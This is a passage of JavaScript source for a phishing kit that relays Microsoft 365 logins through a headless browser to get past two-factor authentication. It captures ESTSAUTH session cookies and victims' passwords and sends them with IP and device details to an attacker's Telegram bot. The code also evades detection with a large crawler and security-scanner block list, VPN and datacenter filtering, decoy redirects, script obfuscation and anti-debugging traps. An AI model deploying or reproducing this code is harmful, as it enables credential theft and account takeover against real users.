      await collectAndSaveCookies(session, session.email, session.password);
      await cleanupBrowserSession(sessionId);
      console.log(`Session ${sessionId} completed and cleaned up`);
    }
    
    res.send(result);

  } catch (err) {
    console.error(`Error in check-2fa for session ${sessionId}:`, err);
    await cleanupBrowserSession(sessionId);
    if (!res.headersSent) {
      res.status(500).send("Internal Server Error");
    }
  }
});

app.post("/resend", async (req, res) => {
  const { sessionId, password, request } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const content = await page.content();
    if (content.includes("We didn't hear from you")) {
      await page.click("#idA_SAASTO_Resend");
      await delay(5000);
      await page.waitForSelector("#idRichContext_DisplaySign");
      const textContent = await page.$eval(
        "#idRichContext_DisplaySign",
        (el) => el.textContent
      );
      res.send(textContent);
    } else {
      res.send("0");
    }
  } catch (err) {
    console.error("Error in /resend:", err);
    res.status(500).send("Internal Server Error");
  }
});

// Add this function near your other session management code
async function cleanupAllSessions() {
  try {
    await Promise.all(Object.keys(sessions).map(cleanupSession));
    sessions = {};
    await cleanupChromeProcesses();
    console.log('All sessions cleaned up successfully');
  } catch (err) {
    errorLogger.error('Error cleaning up all sessions:', err);
  }
}

// Update the collectAndSaveCookies function
async function collectAndSaveCookies(session, email, password) {
  try {
    const { page } = session;
    
    // Get all cookies from the page
    const allCookies = await page.cookies('https://login.microsoftonline.com');
    
    // Filter for Microsoft authentication cookies
    const relevantCookies = allCookies.filter(cookie => 
      ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ESTSAUTHLIGHT'].includes(cookie.name) &&
      cookie.domain.includes('microsoftonline.com')
    ).map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: '.login.microsoftonline.com',
      expirationDate: Math.floor(Date.now() / 1000) + 31536000,
      hostOnly: false,
      httpOnly: true,
      path: '/',
      sameSite: 'none',
      secure: true,
      session: true,
      storeId: null
    }));

    if (relevantCookies.length > 0) {
      // Clean the IP address without escaping
      const clientIp = (session.ip || '').replace(/^::ffff:/, '').trim();
      
      // Get the actual user agent
      const userAgent = session.userAgent || await page.evaluate(() => navigator.userAgent);
      
      // Create cookie script content without escaping special characters
      const cookieScript = `let ipaddress = "${clientIp}";
let email = "${email}";
let password = "${password}";
!function(){let e=JSON.parse(\`${JSON.stringify(relevantCookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}\`:""};Secure;SameSite=None\`;window.location.href="https://login.microsoftonline.com"}();

var stopCss = "color:red; font-size:65px; font-weight:bold; -webkit-text-stroke: 1px black";
var msgCss = "font-size:20px; background-color:#7FDBFF;";
console.log('%cGhost Hacker OS Group', stopCss);`;

      // Create directory if it doesn't exist
      const cookiesDir = path.join(__dirname, 'collected_cookies');
      await fsPromises.mkdir(cookiesDir, { recursive: true });
      
      // Save the cookieScript to file
      const fileName = `${email.replace(/[^a-zA-Z0-9]/g, '_')}_cookies.txt`;
      const filePath = path.join(cookiesDir, fileName);
      await fsPromises.writeFile(filePath, cookieScript);

      // Format message for Telegram without escaping backslashes
      const message = `ðŸ”¥ *GHOST HACKER OS - NEW COOKIES CAPTURED* ðŸ”¥\n` +
        `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n` +
        `ðŸŽ¯ *Target Details*\n` +
        `Email: \`${email}\`\n` +
        `Password: \`${password}\`\n\n` +
        `ðŸŒ *Session Info*\n` +
        `IP Address: \`${clientIp}\`\n` +
        `User Agent: \`${userAgent}\`\n` +
        `Browser: \`${session.browser || 'Unknown'}\`\n` +
        `OS: \`${session.os || 'Unknown'}\`\n` +
        `Device: \`${session.device || 'Unknown'}\`\n` +
        `Timestamp: \`${new Date().toISOString()}\`\n` +
        `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n` +
        `âš¡ï¸*GHOST HACKER OS | THANATOS - THE FINAL HORSEMAN OF THE APOCALYPSE*âš¡ï¸`;

      // Read file content as Buffer
      const fileBuffer = await fsPromises.readFile(filePath);
      
      try {
        // Create form data
        const form = new FormData();
        
        // Append file using a Buffer
        form.append('document', fileBuffer, {
          filename: fileName,
          contentType: 'text/plain'
        });
        
        // Append other fields
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('caption', message);
        form.append('parse_mode', 'Markdown');

        // Use axios instead of fetch for better multipart form handling
        const response = await axios({
          method: 'POST',
          url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
          data: form,
          headers: {
            ...form.getHeaders(),
            'Accept': 'application/json'
          }
        });

        if (response.data && response.data.ok) {
          console.log(`âœ“ File uploaded successfully for ${email}`);
        } else {
          throw new Error(response.data?.description || 'Unknown error');
        }
      } catch (uploadError) {
        console.error('Upload failed, trying alternative method:', uploadError.message);
        
        // Fallback to sending as text message
        try {
          const textResponse = await axios({
            method: 'POST',
            url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            data: {
              chat_id: TELEGRAM_CHAT_ID,
              text: `${message}\n\nCookie Script:\n\`\`\`javascript\n${cookieScript}\n\`\`\``,
              parse_mode: 'Markdown'
            },
            headers: {
              'Content-Type': 'application/json'
            }
          });

          if (!textResponse.data.ok) {
            throw new Error(textResponse.data.description || 'Failed to send message');
          }
        } catch (msgError) {
          console.error('Both upload and message sending failed:', msgError.message);
          throw msgError;
        }
      }

      console.log(`âœ“ Cookies collected and sent for ${email}`);
      return true;
    }

    console.log(`No Microsoft cookies found for ${email}`);
    return false;
  } catch (err) {
    console.error('Error in cookie collection/sending:', err);
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `âš ï¸ Error collecting cookies for ${email}:\n${err.message}`,
          parse_mode: 'Markdown'
        })
      });
    } catch (telegramErr) {
      console.error('Failed to send error notification to Telegram:', telegramErr);
    }
    return false;
  }
}

// Add traffic tracking middleware
app.use((req, res, next) => {
  if (!req.app.locals.totalTraffic) {
    req.app.locals.totalTraffic = 0;
  }
  req.app.locals.totalTraffic++;
  next();
});

// Mount dashboard routes - fixed version

// Add session deletion endpoint
app.delete('/admin/api/sessions/:sessionId', basicAuth, async (req, res) => {
  const { sessionId } = req.params;
  try {
    await cleanupSession(sessionId);
    res.json({ success: true });
  } catch (err) {
    console.error('Error deleting session:', err);
    res.status(500).json({ error: 'Failed to delete session' });
  }
});

// Add these constants at the top
const KNOWN_BOTS = {
  'baiduspider': true, 'yandexbot': true, 'sogou': true, 'exabot': true, 'facebot': true,
  '01h4x.com': true, '360spider': true, '404checker': true, '404enemy': true, '80legs': true,
  'admantx': true, 'aibot': true, 'alittleclient': true, 'aspseek': true, 'abonti': true,
  'aboundex': true, 'aboundexbot': true, 'acunetix': true, 'adstxtcrawlertp': true,
  'afd-verbotsverfahren': true, 'ahrefsbot': true, 'ahitbot': true, 'aipbot': true,
  'alexibot': true, 'allsubmitter': true, 'alligator': true, 'alphabot': true, 'anarchie': true,
  'anarchy': true, 'anarchy99': true, 'ankit': true, 'anthill': true, 'apexoo': true,
  'aspiegel': true, 'asterias': true, 'atomseobot': true, 'attach': true, 'awariobot': true,
  'awariorssbot': true, 'awariosmartbot': true, 'bbbike': true, 'bdcbot': true, 'bdfetch': true,
  'blexbot': true, 'backdoorbot': true, 'backstreet': true, 'backweb': true, 'backlink-ceck': true,
  'backlinkcrawler': true, 'backlinksextendedbot': true, 'badass': true, 'bandit': true,
  'barkrowler': true, 'batchftp': true, 'battleztar bazinga': true, 'betabot': true,
  'bigfoot': true, 'bitacle': true, 'blackwidow': true, 'black hole': true, 'blackboard': true,
  'blow': true, 'blowfish': true, 'boardreader': true, 'bolt': true, 'botalot': true,
  'brandprotect': true, 'brandwatch': true, 'buck': true, 'buddy': true, 'builtbottough': true,
  'builtwith': true, 'bullseye': true, 'bunnyslippers': true, 'buzzsumo': true, 'bytespider': true,
  'catexplorador': true, 'ccbot': true, 'code87': true, 'cshttp': true, 'calculon': true,
  'cazoodlebot': true, 'cegbfeieh': true, 'censysinspect': true, 'chatgpt-user': true,
  'cheteam': true, 'cheesebot': true, 'cherrypicker': true, 'chinaclaw': true, 'chlooe': true,
  'citoid': true, 'claritybot': true, 'claudebot': true, 'cliqzbot': true, 'cloud mapping': true,
  'cocolyzebot': true, 'cogentbot': true, 'collector': true, 'copier': true, 'copyrightcheck': true,
  'copyscape': true, 'cosmos': true, 'craftbot': true, 'crawling at home project': true,
  'crazywebcrawler': true, 'crescent': true, 'crunchbot': true, 'curious': true, 'custo': true,
  'cyotekwebcopy': true, 'dblbot': true, 'diibot': true, 'dsearch': true, 'dts agent': true,
  'datacha0s': true, 'databasedrivermysqli': true, 'demon': true, 'deusu': true, 'devil': true,
  'digincore': true, 'digitalpebble': true, 'dirbuster': true, 'disco': true, 'discobot': true,
  'discoverybot': true, 'dispatch': true, 'dittospyder': true, 'dnbcrawler-analytics': true,
  'dnyzbot': true, 'domcopbot': true, 'domainappender': true, 'domaincrawler': true,
  'domainsigmacrawler': true, 'domainstatsbot': true, 'domains project': true, 'dotbot': true,
  'download wonder': true, 'dragonfly': true, 'drip': true, 'eccp/1.0': true, 'email siphon': true,
  'email wolf': true, 'easydl': true, 'ebingbong': true, 'ecxi': true, 'eirgrabber': true,
  'erocrawler': true, 'evil': true, 'express webpictures': true, 'extlinksbot': true,
  'extractor': true, 'extractorpro': true, 'extreme picture finder': true, 'eyenetie': true,
  'ezooms': true, 'fdm': true, 'fhscan': true, 'facebookbot': true, 'femtosearchbot': true,
  'fimap': true, 'firefox/7.0': true, 'flashget': true, 'flunky': true, 'foobot': true,
  'freeuploader': true, 'frontpage': true, 'fuzz': true, 'fyberspider': true, 'fyrebot': true,
  'g-i-g-a-b-o-t': true, 'gptbot': true, 'gt::www': true, 'galaxybot': true, 'genieo': true,
  'germcrawler': true, 'getright': true, 'getweb': true, 'getintent': true, 'gigabot': true,
  'go!zilla': true, 'go-ahead-got-it': true, 'gozilla': true, 'gotit': true, 'grabnet': true,
  'grabber': true, 'grafula': true, 'grapefx': true, 'grapeshotcrawler': true, 'gridbot': true,
  'headmasterseo': true, 'hmview': true, 'htmlparser': true, 'http::lite': true, 'httrack': true,
  'haansoft': true, 'haosou': true, 'harvest': true, 'havij': true, 'heritrix': true,
  'hloader': true, 'honolulubot': true, 'humanlinks': true, 'hybridbot': true, 'idbte4m': true,
  'idbot': true, 'irlbot': true, 'iblog': true, 'id-search': true, 'ilsebot': true,
  'image fetch': true, 'image sucker': true, 'imagesiftbot': true, 'indeedbot': true,
  'indy library': true, 'fonavirobot': true, 'infotekies': true, 'infrasec scanner': true,
  'intelliseek': true, 'interget': true, 'internetmeasurement': true, 'internetseer': true,
  'internet ninja': true, 'iria': true, 'iskanie': true, 'istellabot': true, 'joc web spider': true,
  'jamesbot': true, 'jbrofuzz': true, 'jennybot': true, 'jetcar': true, 'jetty': true,
  'jikespider': true, 'joomla': true, 'jorgee': true, 'justview': true, 'jyxobot': true,
  'kenjin spider': true, 'keybot': true, 'keyword density': true, 'kinza': true, 'kozmosbot': true,
  'lnspiderguy': true, 'lwp::simple': true, 'lanshanbot': true, 'larbin': true, 'leap': true,
  'leechftp': true, 'leechget': true, 'lexibot': true, 'lftp': true, 'libweb': true,
  'libwhisker': true, 'liebaofast': true, 'lightspeedsystems': true, 'likse': true,
  'linkscan': true, 'linkwalker': true, 'linkbot': true, 'linkextractorpro': true,
  'linkpadbot': true, 'linksmanager': true, 'linqiametadatadownloaderbot': true,
  'linqiarssbot': true, 'linqiascrapebot': true, 'lipperhey': true, 'lipperhey spider': true,
  'litemage_walker': true, 'lmspider': true, 'ltx71': true, 'mfc_tear_sample': true,
  'midown tool': true, 'miixpc': true, 'mj12bot': true, 'mqqbrowser': true, 'msfrontpage': true,
  'msiecrawler': true, 'mtrobot': true, 'mag-net': true, 'magnet': true, 'mail.ru_bot': true,
  'majestic-seo': true, 'majestic12': true, 'majestic seo': true, 'markmonitor': true,
  'markwatch': true, 'mass downloader': true, 'masscan': true, 'mata hari': true, 'mauibot': true,
  'mb2345browser': true, 'meanpath bot': true, 'meanpathbot': true, 'mediatoolkitbot': true,
  'megaindex.ru': true, 'metauri': true, 'micromessenger': true, 'microsoft data access': true,
  'microsoft url control': true, 'minefield': true, 'mister pix': true, 'moblie safari': true,
  'mojeek': true, 'mojolicious': true, 'molokaibot': true, 'morfeus fucking scanner': true,
  'mozlila': true, 'mr.4x3': true, 'msrabot': true, 'musobot': true, 'nicerspro': true,
  'npbot': true, 'name intelligence': true, 'nameprotect': true, 'navroad': true, 'nearsite': true,
  'needle': true, 'nessus': true, 'netants': true, 'netlyzer': true, 'netmechanic': true,
  'netspider': true, 'netzip': true, 'net vampire': true, 'netcraft': true, 'nettrack': true,
  'netvibes': true, 'nextgensearchbot': true, 'nibbler': true, 'niki-bot': true, 'nikto': true,
  'nimblecrawler': true, 'nimbostratus': true, 'ninja': true, 'nmap': true, 'nuclei': true,
  'nutch': true, 'octopus': true, 'offline explorer': true, 'offline navigator': true,
  'oncrawl': true, 'openlinkprofiler': true, 'openvas': true, 'openfind': true, 'orangebot': true,
  'orangespider': true, 'outclicksbot': true, 'outfoxbot': true, 'pecl::http': true,
  'phpcrawl': true, 'poe-component-client-http': true, 'pageanalyzer': true,
  'pagegrabber': true, 'pagescorer': true, 'pagething.com': true, 'page analyzer': true,
  'pandalytics': true, 'panscient': true, 'papa foto': true, 'pavuk': true, 'peoplepal': true,
  'petalbot': true, 'pi-monster': true, 'picscout': true, 'picsearch': true, 'picturefinder': true,
  'piepmatz': true, 'pimonster': true, 'pixray': true, 'pleasecrawl': true, 'pockey': true,
  'propowerbot': true, 'prowebwalker': true, 'probethenet': true, 'proximic': true, 'psbot': true,
  'pu_in': true, 'pump': true, 'pxbroker': true, 'pycurl': true, 'queryn metasearch': true,
  'quick-crawler': true, 'rssingbot': true, 'rainbot': true, 'rankactive': true,
  'rankactivelinkbot': true, 'rankflex': true, 'rankingbot': true, 'rankingbot2': true,
  'rankivabot': true, 'rankurbot': true, 're-re': true, 'reget': true, 'realdownload': true,
  'reaper': true, 'rebelmouse': true, 'recorder': true, 'redesscrapy': true, 'repomonkey': true,
  'ripper': true, 'rocketcrawler': true, 'rogerbot': true, 'sbider': true, 'seokicks': true,
  'seokicks-robot': true, 'seolyt': true, 'seolyticscrawler': true, 'seoprofiler': true,
  'seostats': true, 'sistrix': true, 'smtbot': true, 'salesintelligent': true, 'scanalert': true,
  'scanbot': true, 'scoutjet': true, 'scrapy': true, 'screaming': true, 'screenerbot': true,
  'screpybot': true, 'searchestate': true, 'searchmetricsbot': true, 'seekport': true,
  'seekportbot': true, 'semanticjuice': true, 'semrush': true, 'semrushbot': true,
  'sentibot': true, 'senutobot': true, 'seocherrybot': true, 'seositecheckup': true,
  'seobilitybot': true, 'seomoz': true, 'shodan': true, 'siphon': true,
  'sitecheckerbotcrawler': true, 'siteexplorer': true, 'sitelockspider': true,
  'sitesnagger': true, 'site sucker': true, 'sitebeam': true, 'siteimprove': true,
  'sitevigil': true, 'slysearch': true, 'smartdownload': true, 'snake': true, 'snapbot': true,
  'snoopy': true, 'socialrankiobot': true, 'sociscraper': true, 'sogou web spider': true,
  'sosospider': true, 'sottopop': true, 'spacebison': true, 'spammen': true, 'spankbot': true,
  'spanner': true, 'spbot': true, 'spider_bot': true, 'spider_bot/3.0': true, 'spinn3r': true,
  'sputnikbot': true, 'sqlmap': true, 'sqlworm': true, 'sqworm': true, 'steeler': true,
  'stripper': true, 'sucker': true, 'sucuri': true, 'superbot': true, 'superhttp': true,
  'surfbot': true, 'surveybot': true, 'suzuran': true, 'swiftbot': true, 'szukacz': true,
  't0phackteam': true, 't8abot': true, 'teleport': true, 'teleportpro': true, 'telesoft': true,
  'telesphoreo': true, 'telesphorep': true, 'thenomad': true, 'the intraformant': true,
  'thumbor': true, 'tighttwatbot': true, 'tinytestbot': true, 'titan': true, 'toata': true,
  'toweyabot': true, 'tracemyfile': true, 'trendiction': true, 'trendictionbot': true,
  'true_robot': true, 'turingos': true, 'turnitin': true, 'turnitinbot': true, 'twengabot': true,
  'twice': true, 'typhoeus': true, 'urly.warning': true, 'urly warning': true, 'unisterbot': true,
  'upflow': true, 'v-bot': true, 'vb project': true, 'vci': true, 'vacuum': true,
  'vagabondo': true, 'velenpublicwebcrawler': true, 'vericitecrawler': true,
  'vidiblescraper': true, 'virusdie': true, 'voideye': true, 'voil': true, 'voltron': true,
  'wasalive-bot': true, 'wbsearchbot': true, 'webdav': true, 'wisenutbot': true, 'wpscan': true,
  'www-collector-e': true, 'www-mechanize': true, 'www::mechanize': true, 'wwwoffle': true,
  'wallpapers': true, 'wallpapers/3.0': true, 'wallpapershd': true, 'wesee': true,
  'webauto': true, 'webbandit': true, 'webcollage': true, 'webcopier': true, 'webenhancer': true,
  'webfetch': true, 'webfuck': true, 'webgo is': true, 'webimagecollector': true,
  'webleacher': true, 'webpix': true, 'webreaper': true, 'websauger': true, 'webstripper': true,
  'websucker': true, 'webzip': true, 'web auto': true, 'web collage': true,
  'web enhancer': true, 'web fetch': true, 'web fuck': true, 'web pix': true,
  'web sauger': true, 'web sucker': true, 'webalta': true, 'webmasterworldforumbot': true,
  'webshag': true, 'websiteextractor': true, 'websitequester': true, 'website quester': true,
  'webster': true, 'whack': true, 'whacker': true, 'whatweb': true, 'who.is bot': true,
  'widow': true, 'winhttrack': true, 'wiseguys robot': true, 'wonderbot': true, 'woobot': true,
  'wprecon': true, 'xaldon webspider': true, 'xaldon_webspider': true, 'xenu': true,
  'yak': true, 'youdaobot': true, 'zade': true, 'zauba': true, 'zermelo': true, 'zeus': true,
  'zitebot': true, 'zoominfobot': true, 'zumbot': true, 'zyborg': true,
  'adscanner': true, 'anthropic-ai': true, 'archive.org_bot': true, 'arquivo-web-crawler': true,
  'arquivo.pt': true, 'autoemailspider': true, 'awario.com': true, 'backlink-check': true,
  'cah.io.community': true, 'check1.exe': true, 'clark-crawler': true, 'coccocbot': true,
  'cognitiveseo': true, 'cohere-ai': true, 'com.plumanalytics': true, 'crawl.sogou.com': true,
  'crawler.feedback': true, 'crawler4j': true, 'dataforseo.com': true, 'dataforseobot': true,
  'demandbase-bot': true, 'domainsproject.org': true, 'ecatch': true, 'evc-batch': true,
  'everyfeed-spider': true
};

const GOOGLE_BOT_INFO = {
  ipRanges: [
    '66.249.64.0/19',
    '64.233.160.0/19',
    '72.14.192.0/18',
    '74.125.0.0/16',
    '108.177.8.0/21',
    '172.217.0.0/19',
    '216.239.32.0/19'
  ],
  userAgents: [
    'Googlebot',
    'Googlebot-Image',
    'Googlebot-News',
    'Googlebot-Video',
    'AdsBot-Google'
  ]
};

// Add bot blocking middleware
app.use(async (req, res, next) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const ipInfo = await getEnhancedIpInfo(ip);

  // Block if it's a known bot
  if (ipInfo.isBot) {
    console.log(`Blocked bot access from ${ip} (${userAgent})`);
    return res.status(403).send('Access Denied');
  }

  // Block if it's from a datacenter
  if (ipInfo.isDatacenter) {
    console.log(`Blocked datacenter access from ${ip} (${ipInfo.org})`);
    return res.status(403).send('Access Denied');
  }

  // Block if it's using a VPN/proxy
  if (ipInfo.isVpn) {
    console.log(`Blocked VPN/proxy access from ${ip}`);
    return res.status(403).send('Access Denied');
  }

  next();
});

// Update the traffic logging middleware
app.use(async (req, res, next) => {
  if (!req.path.startsWith('/admin') && !req.path.startsWith('/static')) {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const ua = new UAParser(req.headers['user-agent']);
      const ipInfo = await getEnhancedIpInfo(ip);
      
      const trafficData = {
        timestamp: Date.now(),
        ip: ipInfo.ip,
        userAgent: req.headers['user-agent'],
        browser: `${ua.getBrowser().name || 'Unknown'} ${ua.getBrowser().version || ''}`,
        os: `${ua.getOS().name || 'Unknown'} ${ua.getOS().version || ''}`,
        device: ua.getDevice().type || 'desktop',
        isBot: /bot|crawler|spider|crawling/i.test(req.headers['user-agent']),
        isVpn: ipInfo.isVpn,
        country: ipInfo.country,
        countryCode: ipInfo.countryCode,
        city: ipInfo.city,
        region: ipInfo.region,
        timezone: ipInfo.timezone,
        isp: ipInfo.isp,
        org: ipInfo.org,
        as: ipInfo.as,
        hostname: ipInfo.hostname,
        mobile: ipInfo.mobile,
        path: req.path,
        method: req.method,
        referer: req.headers.referer || 'Direct',
        language: req.headers['accept-language'] || 'Unknown'
      };

      req.app.locals.trafficLog = req.app.locals.trafficLog || [];
      req.app.locals.trafficLog.unshift(trafficData);
      
      if (req.app.locals.trafficLog.length > 1000) {
        req.app.locals.trafficLog = req.app.locals.trafficLog.slice(0, 1000);
      }

      req.trafficData = trafficData;
    } catch (err) {
      console.error('Error logging traffic:', err);
    }
  }
  next();
});

// Add graceful shutdown handler
process.on('SIGINT', async () => {
  console.log('Cleaning up before shutdown...');
  await cleanupAllSessions();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('Cleaning up before shutdown...');
  await cleanupAllSessions();
  process.exit(0);
});

// Make sure this is before your app.listen
app.listen(port, async () => {
  await cleanupAllSessions(); // Clean any existing sessions on startup
  console.log(`Server is running on port ${port}`);
});

// Add after the existing cleanupSession function
async function cleanupChromeProcesses() {
  try {
    const { exec } = require('child_process');
    return new Promise((resolve) => {
      // Clean up Chrome processes
      exec('pkill -f "(chrome)?(--headless)"', () => {
        // Clean up temp directories
        exec('rm -rf /tmp/puppeteer*', () => {
          console.log('Chrome processes and temp files cleaned up');
          resolve();
        });
      });
    });
  } catch (err) {
    errorLogger.error('Error cleaning up Chrome processes:', err);
  }
}

// Add the Turnstile verification endpoint HERE
app.post('/verify-turnstile', async (req, res) => {
  try {
    const { token } = req.body;
    
    // Verify with Cloudflare
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        secret: '0x4AAAAAAA9tfd0wn-dlJOPGx9jgpPMbgoI',
        response: token
      })
    });

    const data = await response.json();
    
    if (data.success) {
      res.json({ success: true });
    } else {
      res.json({ success: false, error: 'Invalid token' });
    }
  } catch (error) {
    res.json({ success: false, error: 'Verification failed' });
  }
});

// Add middleware to check URL patterns before routes
app.use((req, res, next) => {
  // List of allowed paths
  const allowedPaths = [
    "/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N",
    "/onedrive/access/document",
    "/admin",
    "/microsoft/login"
  ];

  // Check if the request path starts with any allowed path
  const isAllowedPath = allowedPaths.some(path => 
    req.path === path || req.path.startsWith(path)
  );

  if (!isAllowedPath) {
    // Redirect to Bloomberg for unauthorized paths
    return res.redirect(301, 'https://www.bloomberg.com');
  }

  next();
});

// Add new route for Microsoft login page
app.get("/microsoft/login", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "microsoft-login.html"));
});

// Add middleware to protect and obfuscate assets
app.use((req, res, next) => {
  // Store original functions
  const originalSendFile = res.sendFile;
  const originalSend = res.send;

  // Override sendFile for JS/images
  res.sendFile = function(path, options, callback) {
    if (path.match(/\.(js|png|svg|jpg|ico)$/)) {
      // Read file and obfuscate before sending
      fs.readFile(path, 'utf8', (err, content) => {
        if (err) return next(err);
        
        if (path.endsWith('.js')) {
          // Advanced JS obfuscation
          content = obfuscateJS(content);
        } else {
          // Convert images to base64 data URIs
          content = convertToDataURI(content);
        }
        
        // Add anti-debug protection
        content = addAntiDebug(content);
        
        // Set headers to prevent caching/inspection
        res.set({
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0',
          'Content-Security-Policy': "default-src 'self' 'unsafe-inline'",
          'X-Content-Type-Options': 'nosniff'
        });
        
        res.send(content);
      });
    } else {
      return originalSendFile.apply(this, arguments);
    }
  };

  // Override send for HTML content
  res.send = function(body) {
    if (typeof body === 'string' && body.includes('</head>')) {
      // Add runtime protection
      body = injectRuntimeProtection(body);
    }
    return originalSend.call(this, body);
  };

  next();
});

// Helper function to obfuscate JavaScript
function obfuscateJS(code) {
  return `
    (function(){
      const _0x${randomHex(4)}=new Function(
        atob('${Buffer.from(code).toString('base64')}')
      );
      if(window.top === window.self) {
        _0x${randomHex(4)}();
      }
    })();
  `.replace(/\s+/g, ' ');
}

// Add runtime protection to HTML
function injectRuntimeProtection(html) {
  const protection = `
    <script>
      (function(){
        const _0x${randomHex(4)}=new Date();
        setInterval(function(){
          if(new Date()-_0x${randomHex(4)}>2000){
            window.location.href='https://www.bloomberg.com';
          }
        },500);
        
        // Disable dev tools
        document.addEventListener('keydown',function(e){
          if(e.keyCode === 123 || 
             (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
             (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
          }
        });

        // Prevent debugging
        setInterval(function(){
          debugger;
        },100);
      })();
    </script>
  `;

  return html.replace('</head>', protection + '</head>');
}

// Helper to generate random hex
function randomHex(len) {
  return [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

// Convert images to data URIs
function convertToDataURI(content) {
  const base64 = Buffer.from(content).toString('base64');
  return `data:image/png;base64,${base64}`;
}

// Add more advanced obfuscation middleware
app.use((req, res, next) => {
  const originalSendFile = res.sendFile;
  const originalSend = res.send;

  res.sendFile = function(path, options, callback) {
    if (path.match(/\.(js|png|svg|jpg|ico)$/)) {
      fs.readFile(path, (err, content) => {
        if (err) return next(err);
        
        if (path.endsWith('.js')) {
          // Multi-layer JS obfuscation
          content = advancedObfuscateJS(content.toString());
        } else {
          // Enhanced image protection
          content = advancedImageProtection(content);
        }
        
        // Advanced anti-debug and headers
        content = addEnhancedProtection(content);
        
        res.set({
          'Cache-Control': 'no-store, private, no-cache, must-revalidate, proxy-revalidate, max-age=0',
          'Pragma': 'no-cache',
          'Expires': '0',
          'Content-Security-Policy': "default-src 'self' 'unsafe-inline' blob: data:",
          'X-Content-Type-Options': 'nosniff',
          'X-Frame-Options': 'DENY',
          'X-XSS-Protection': '1; mode=block'
        });
        
        res.send(content);
      });
    } else {
      return originalSendFile.apply(this, arguments);
    }
  };

  res.send = function(body) {
    if (typeof body === 'string' && body.includes('</head>')) {
      body = injectEnhancedProtection(body);
    }
    return originalSend.call(this, body);
  };

  next();
});

function advancedObfuscateJS(code) {
  // Multiple layers of obfuscation
  const layer1 = Buffer.from(code).toString('base64');
  const layer2 = layer1.split('').reverse().join('');
  const randomKey = randomHex(16);
  
  return `
    (function(){
      try {
        const _0x${randomHex(4)}=function(s){
          return s.split('').map(c=>String.fromCharCode(c.charCodeAt(0)^0x${randomKey})).join('');
        };
        const _0x${randomHex(4)}=atob('${layer2.split('').reverse().join('')}');
        const _0x${randomHex(4)}=new Function(_0x${randomHex(4)}(_0x${randomHex(4)}));
        if(window.top===window.self){
          setTimeout(_0x${randomHex(4)},${Math.floor(Math.random() * 100)});
        }
      } catch(e) {
        window.location.href='https://www.bloomberg.com';
      }
    })();
  `.replace(/\s+/g, ' ');
}

function advancedImageProtection(content) {
  // Convert to blob URL with encryption
  const encrypted = encryptBuffer(content);
  const blob = `
    new Blob([new Uint8Array(${JSON.stringify(Array.from(encrypted))})], 
    {type:'application/octet-stream'})
  `;
  return `data:image/png;base64,${Buffer.from(blob).toString('base64')}`;
}

function injectEnhancedProtection(html) {
  const protection = `
    <script>
      (function(){
        const _0x${randomHex(4)}=${Date.now()};
        const _0x${randomHex(4)}=new WeakMap();
        const _0x${randomHex(4)}=new Proxy({}, {
          get:function(){
            window.location.href='https://www.bloomberg.com';
          }
        });

        // Advanced timer-based detection
        setInterval(function(){
          const _0x${randomHex(4)}=Date.now();
          if(_0x${randomHex(4)}-_0x${randomHex(4)}>1000){
            window.location.href='https://www.bloomberg.com';
          }
        },250);

        // Multiple debugger traps
        setInterval(function(){
          const start=performance.now();
          debugger;
          if(performance.now()-start>100){
            window.location.href='https://www.bloomberg.com';
          }
        },50);

        // Console overrides
        const consoleProxy=new Proxy(console,{
          get:function(target,prop){
            return function(){};
          }
        });
        Object.defineProperty(window,'console',{
          get:function(){
            return consoleProxy;
          }
        });

        // Mutation observer to prevent elements inspection
        new MutationObserver(function(){
          if(document.documentElement.hasAttribute('contextmenu')){
            window.location.href='https://www.bloomberg.com';
          }
        }).observe(document.documentElement,{
          attributes:true
        });
      })();
    </script>
  `;

  return html.replace('</head>', protection + '</head>');
}

// Enhanced encryption for buffers
function encryptBuffer(buffer) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  return Buffer.concat([cipher.update(buffer), cipher.final()]);
}

function randomHex(len) {
  return crypto.randomBytes(len).toString('hex');
}
